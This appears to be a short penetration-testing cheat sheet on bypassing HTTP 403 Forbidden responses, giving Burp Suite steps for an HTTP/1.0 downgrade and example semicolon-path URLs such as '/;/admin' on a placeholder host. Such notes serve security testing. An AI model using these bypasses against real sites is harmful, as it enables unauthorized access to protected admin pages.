# 403 Forbidden Bypasses

- Downgrade HTTP Protocol Version
- Semicolon Bypass (;)

---
### Downgrade HTTP Protocol Version

  - Capture the request in BurpSuite - Send to Repeater
  - Change the http protocol version from **1.1** to **1.0** and clear all the other headers from the request
  - Forward the request to the Server
  - Reference: [Link](https://medium.com/@abbasheybati1/403-bypass-lyncdiscover-microsoft-com-db2778458c33)
---
### Semicolon Bypass (;)

Forbidden:
```CSS
https://www.hackme.in/admin
```
Bypassed:
```CSS
https://www.hackme.in/;/admin
https://www.hackme.in/;/admin/config/listConfiguration
```
---
